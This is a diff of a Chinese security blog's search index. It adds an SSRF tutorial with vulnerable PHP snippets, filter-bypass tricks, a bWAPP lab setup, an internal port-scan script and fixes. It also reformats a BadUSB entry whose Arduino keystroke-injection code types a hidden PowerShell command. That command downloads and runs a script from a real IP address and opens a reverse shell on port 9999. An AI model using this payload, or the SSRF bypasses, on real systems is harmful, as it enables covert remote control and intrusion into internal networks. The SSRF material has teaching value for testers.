@@ -2,6 +2,114 @@
 <search>
   <entry>
     <title>序列化与反序列化</title>
+    <url>/2019/12/15/SSRF/</url>
+    <content><![CDATA[<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<a id="more"></a>
+
+<h2 id="0x00-概念"><a href="#0x00-概念" class="headerlink" title="0x00 概念"></a>0x00 概念</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
+<p>注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p>
+<h2 id="0x01-可能出现的地方"><a href="#0x01-可能出现的地方" class="headerlink" title="0x01 可能出现的地方"></a>0x01 可能出现的地方</h2><p>1.社交分享功能：获取超链接的标题等内容进行显示</p>
+<p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
+<p>3.在线翻译：给网址翻译对应网页的内容</p>
+<p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
+<p>5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
+<p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
+<p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
+<p>8.数据库内置功能：数据库的比如<code>mongodb</code>的<code>copyDatabase</code>函数</p>
+<p>9.邮件系统：比如接收邮件服务器地址</p>
+<p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
+<p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
+<p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>
+<p>12.从远程服务器请求资源（upload from url 如discuz!;  import &amp; expost rss feed 如web blog;  使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
+<p>13.WebHooks：寻找触发特定事件时发出http请求的服务。在大多数WebHooks的功能中，终端用户可以选择他们的终端点和主机名。尝试向内部服务发送http请求。</p>
+<p>14.PDF生成器：试着注入指向内部服务的<code>&lt;iframe&gt;,&lt;img&gt;,&lt;base&gt;</code>或者<code>&lt;script&gt;</code>元素或者CSS的<code>url()</code>函数。</p>
+<p>15.文档解析器：尝试了解文档是如何被解析的。如果是XML文档，那就是用了PDF生成器方法。对于其他文档，检查是否存在引用外部资源的方法然后通过服务器向内部服务发送请求。</p>
+<p>16.链接扩展: 最近<a href="https://twitter.com/BugBountyHQ/status/868242771617792000" target="_blank" rel="noopener">Mark Litchfield在推特扩展链接上发现了漏洞</a>，名声大涨。</p>
+<p>17.文件上传：与常规上传文件相反，尝试发送url请求然后检查是否下载了url的内容。<a href="https://hackerone.com/reports/713" target="_blank" rel="noopener">例子</a></p>
+<h2 id="0x02-漏洞验证"><a href="#0x02-漏洞验证" class="headerlink" title="0x02 漏洞验证"></a>0x02 漏洞验证</h2><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求。</p>
+<p>比如：该资源地址类型为 <code>http://www.xxx.com/a.php?image=(地址)</code>的就可能存在SSRF漏洞。</p>
+<p>2.dnslog等工具进行测试，看是否被访问。</p>
+<ul>
+<li>可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</li>
+</ul>
+<p>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址。</p>
+<ul>
+<li><p>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p>
+</li>
+<li><p>通过二级域名暴力猜解工具模糊猜测内网地址。</p>
+</li>
+</ul>
+<p>4.直接返回的Banner、title、content等信息。</p>
+<p>5.留意bool型SSRF</p>
+<h2 id="0x03-一些利用方式"><a href="#0x03-一些利用方式" class="headerlink" title="0x03 一些利用方式"></a>0x03 一些利用方式</h2><p>1.让服务端去访问相应的网址 比如在自己的服务器上监听端口然后在url让他去请求我们的服务器</p>
+<p>2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</p>
+<p>3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</p>
+<p>4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</p>
+<p>5.攻击内网应用程序（利用跨协议通信技术）</p>
+<p>6.判断内网主机是否存活：方法是访问看是否有端口开放</p>
+<p>某些时候SSRF漏洞可以用作局域网内的端口扫描。这有助于理清内网的基础设施轮廓和并为下一步其他漏洞的利用做铺垫。上述这种情况通常是最简单的blind SSRF了。如果之前的脚本无法建立连接或收不到服务器响应，异常将被抛出。利用这个特征可以识别端口是否开放（连接建立）或关闭（连接失败或超时）。</p>
+<h2 id="0x04-绕过小技巧"><a href="#0x04-绕过小技巧" class="headerlink" title="0x04 绕过小技巧"></a>0x04 绕过小技巧</h2><p>1.<a href="http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的" target="_blank" rel="noopener">http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的</a></p>
+<p>2.各种IP地址的进制转换</p>
+<p>3.URL跳转绕过：<a href="http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/" target="_blank" rel="noopener">http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/</a></p>
+<p>4.短网址绕过 <a href="http://t.cn/RwbLKDx" target="_blank" rel="noopener">http://t.cn/RwbLKDx</a></p>
+<p>5.xip.io来绕过：<a href="http://192.168.0.1.xip.io/" target="_blank" rel="noopener">http://192.168.0.1.xip.io/</a> == 192.168.0.1 </p>
+<p>6.限制了子网段，可以加 :80 端口绕过。<a href="http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80" target="_blank" rel="noopener">http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80</a></p>
+<p>7.探测内网域名，或者将自己的域名解析到内网ip</p>
+<p>8.例如 <a href="http://10.153.138.81/ts.php" target="_blank" rel="noopener">http://10.153.138.81/ts.php</a> , 修复时容易出现的获取host时以/分割来确定host，</p>
+<p>但这样可以用 <a href="http://abc@10.153.138.81/" target="_blank" rel="noopener">http://abc@10.153.138.81/</a> 绕过</p>
+<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><p>1.禁止跳转</p>
+<p>2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+<p>3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</p>
+<p>4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p>
+<p>5.限制请求的端口为http常用的端口，比如 80、443、8080、8090</p>
+<p>6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+<h2 id="0x06-漏洞利用中牵涉的小技巧"><a href="#0x06-漏洞利用中牵涉的小技巧" class="headerlink" title="0x06 漏洞利用中牵涉的小技巧"></a>0x06 漏洞利用中牵涉的小技巧</h2><p>crontab -l 显示当前计划任务</p>
+<p>crontab -r 清除当前计划任务</p>
+<p>端口转发工具 socat</p>
+<p>在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行</p>
+<p>AddType application/x-httpd-php .jpg<br>……</p>
+<p>常用的探测内网地址</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.0.0.0/8 127.0.0.1/32 172.16.0.0/12 192.168.0.0/16</span><br></pre></td></tr></table></figure>
+
+<p>常用的探测端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21, 22, 23, 25, 53, 80, 110, 443, 1433, 3306, 3389, 8080, 8443</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-举一个栗子"><a href="#0x07-举一个栗子" class="headerlink" title="0x07 举一个栗子"></a>0x07 举一个栗子</h2><p>先说一下关于SSRF的<strong>函数</strong></p>
+<p>curl造成的SSRF</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function curl($url)&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure>
+
+<p>file_get_contents造成的SSRF</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">echo file_get_contents($url);</span><br></pre></td></tr></table></figure>
+<p>fsockopen造成的SSRF</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function Getfile($host, $port, $link)&#123;</span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);</span><br><span class="line">    if(!$fp)&#123;</span><br><span class="line">        echo &quot;$errstr (error number $errno) \n&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $out = &quot;GET $link HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out .= &quot;HOST $host \r\n&quot;;</span><br><span class="line">        $out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">        $out .= &quot;\r\n&quot;;</span><br><span class="line">        fwrite($fp, $out);</span><br><span class="line">        $content = &apos;&apos;;</span><br><span class="line">        while(!feof($fp))&#123;</span><br><span class="line">            $contents .= fgets($fp, 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line">        return $contents;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们直接使用docker搭建了Bwapp平台做测试 其实本地搭建php就可以</p>
+<p>docker使用命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search bwapp</span><br><span class="line">docker pull raesene/bwapp</span><br><span class="line">docker run -d -p 8080:80 raesene/bwapp</span><br></pre></td></tr></table></figure>
+
+<p>这里我们选择文件包含测试 难度选择low 点击GO</p>
+<p><img src="/images/SSRF/bwapp2.png" alt="html">    </p>
+<p><img src="/images/SSRF/bwapp1.png" alt="html">    </p>
+<p>这时候我们可以看到<code>language</code>参数的值是一个文件 这时候我们用内网探测脚本试一试</p>
+<p><img src="/images/SSRF/bwapp3.png" alt="html">    </p>
+<p>这里放出内网探测的脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"ip"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//list of port numbers to scan</span></span><br><span class="line">    $ports = <span class="keyword">array</span>(<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">110</span>, <span class="number">1433</span>, <span class="number">3306</span>);</span><br><span class="line">    </span><br><span class="line">    $results = <span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span>($ports <span class="keyword">as</span> $port)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($pf = @fsockopen($_REQUEST[<span class="string">"ip"</span>], $port, $err, $err_string, <span class="number">1</span>))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $results[$port] = <span class="keyword">true</span>;</span><br><span class="line">            fclose($pf);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $results[$port] = <span class="keyword">false</span>;        </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">foreach</span>($results <span class="keyword">as</span> $port=&gt;$val)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $prot = getservbyport($port,<span class="string">"tcp"</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Port $port ($prot): "</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($val)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;span style=\"color:green\"&gt;OK&lt;/span&gt;&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;span style=\"color:red\"&gt;Inaccessible&lt;/span&gt;&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其实这里是有一个坑的 网上的一些教程说是在bwapp里选择ssrf会提供三个脚本 但是我去docker里找了根本没有这个文件夹 然后又去github上找了这个docker的文件 发现也没有emmm 最后在github上搜到了这个脚本 我把链接贴出来<a href="https://github.com/theand-fork/bwapp-code" target="_blank" rel="noopener">Bwapp 的POC</a></p>
+<p>Redis getshll留坑 原先写过 找不到了等重新加到后面吧。</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>漏洞挖掘</tag>
+        <tag>SSRF</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>序列化与反序列化</title>
     <url>/2019/12/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>漏洞：通常情况下不影响软件的正常功能，但如果被攻击者利用，有可能驱使软件去执行一些额外的恶意代码，从而引发</p>
 <p>内存中的数据对象只有转换成二进制才可以进行数据持久化和网络传输。将数据对象转换成二进制的流程称之为对象的序列化（Serialization）。反之，将二进制流恢复为数据对象的过程称之为反序列化（Deserialization）。序列化需要保留充分的信息以恢复数据对象，但是为了节省存储空间和网络带宽，序列化后的二进制流又要尽可能的小。</p>
@@ -67,8 +175,8 @@
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>php</tag>
         <tag>漏洞挖掘</tag>
+        <tag>php</tag>
         <tag>序列化</tag>
       </tags>
   </entry>
@@ -507,8 +615,8 @@
         <category>webshell</category>
       </categories>
       <tags>
-        <tag>js</tag>
         <tag>php</tag>
+        <tag>js</tag>
       </tags>
   </entry>
   <entry>
@@ -517,7 +625,7 @@
     <content><![CDATA[<p>在2014年美国黑帽大会上，柏林SRLabs的安全研究人员JakobLell和独立安全研究人员Karsten Nohl展示了他们称为“BadUSB”(按照BadBIOS命名)的攻击方法，这种攻击方法让USB安全和几乎所有和USB相关的设备(包括具有USB端口的电脑)都陷入相当危险的状态。</p>
 <a id="more"></a>
 
-<h5 id="Windows系统自启动路径"><a href="#Windows系统自启动路径" class="headerlink" title="Windows系统自启动路径"></a>Windows系统自启动路径</h5><pre><code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><h4 id="附自己的一些代码"><a href="#附自己的一些代码" class="headerlink" title="附自己的一些代码"></a>附自己的一些代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Keyboard.h&gt; //包含键盘模块头文件</span><br><span class="line">void setup()&#123; //初始化</span><br><span class="line">Keyboard.begin();//开始键盘通信</span><br><span class="line">delay(1000);//延时1000毫秒，</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 </span><br><span class="line">Keyboard.press(&apos;r&apos;);//按下r键 CMD</span><br><span class="line">delay(500); </span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);//松掉win键 </span><br><span class="line">Keyboard.release(&apos;r&apos;);//松掉r键 </span><br><span class="line">Keyboard.println(&quot;cmd&quot;);</span><br><span class="line">delay(500); </span><br><span class="line">//Keyboard.println(&quot;cmd.exe /T:01 /K mode CON: COLS=16 LINES=1&quot;); //缩小窗口</span><br><span class="line">//Keyboard.println(&quot;$clnt = new-object System.Net.WebClient;$url= &apos;http://47.93.12.104/water.ps1&apos;;$file = &apos;D:\\melon.ps1&apos;;$clnt.DownloadFile($url,$file);D:\\melon.ps1;&quot;);</span><br><span class="line">//.println(&quot;powershell -w hidden while(1)&#123;IEX (New-Object Net.WebClient).DownloadString(&apos;D:\\melon.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 47.93.12.104 -port 9999&#125;&quot;);</span><br><span class="line">Keyboard.println(&quot;powershell -w hidden while(1)&#123;IEX (New-Object Net.WebClient).DownloadString(&apos;http://47.93.12.104/water.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 47.93.12.104 -port 9999&#125;&quot;);</span><br><span class="line">Keyboard.press(KEY_RETURN);  //按下回车键</span><br><span class="line">Keyboard.release(KEY_RETURN); //释放回车键</span><br><span class="line">Keyboard.end();//结束键盘通讯 </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">void loop()//循环，这里的代码</span><br><span class="line">&#123; </span><br><span class="line">//循环体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+<h5 id="Windows系统自启动路径"><a href="#Windows系统自启动路径" class="headerlink" title="Windows系统自启动路径"></a>Windows系统自启动路径</h5><pre><code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><h4 id="附自己的一些代码"><a href="#附自己的一些代码" class="headerlink" title="附自己的一些代码"></a>附自己的一些代码</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include&lt;Keyboard.h&gt; //包含键盘模块头文件</span></span><br><span class="line">void setup()&#123; //初始化</span><br><span class="line">Keyboard.begin();//开始键盘通信</span><br><span class="line">delay(<span class="number">1000</span>);//延时<span class="number">1000</span>毫秒，</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 </span><br><span class="line">Keyboard.press(<span class="string">'r'</span>);//按下r键 CMD</span><br><span class="line">delay(<span class="number">500</span>); </span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);//松掉win键 </span><br><span class="line">Keyboard.release(<span class="string">'r'</span>);//松掉r键 </span><br><span class="line">Keyboard.println(<span class="string">"cmd"</span>);</span><br><span class="line">delay(<span class="number">500</span>); </span><br><span class="line">//Keyboard.println(<span class="string">"cmd.exe /T:01 /K mode CON: COLS=16 LINES=1"</span>); //缩小窗口</span><br><span class="line">//Keyboard.println(<span class="string">"<span class="variable">$clnt</span> = new-object System.Net.WebClient;<span class="variable">$url</span>= 'http://47.93.12.104/water.ps1';<span class="variable">$file</span> = 'D:\\melon.ps1';<span class="variable">$clnt</span>.DownloadFile(<span class="variable">$url</span>,<span class="variable">$file</span>);D:\\melon.ps1;"</span>);</span><br><span class="line">//.println(<span class="string">"powershell -w hidden while(1)&#123;IEX (New-Object Net.WebClient).DownloadString('D:\\melon.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 47.93.12.104 -port 9999&#125;"</span>);</span><br><span class="line">Keyboard.println(<span class="string">"powershell -w hidden while(1)&#123;IEX (New-Object Net.WebClient).DownloadString('http://47.93.12.104/water.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 47.93.12.104 -port 9999&#125;"</span>);</span><br><span class="line">Keyboard.press(KEY_RETURN);  //按下回车键</span><br><span class="line">Keyboard.release(KEY_RETURN); //释放回车键</span><br><span class="line">Keyboard.end();//结束键盘通讯 </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">void loop()//循环，这里的代码</span><br><span class="line">&#123; </span><br><span class="line">//循环体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>硬件安全</category>
       </categories>
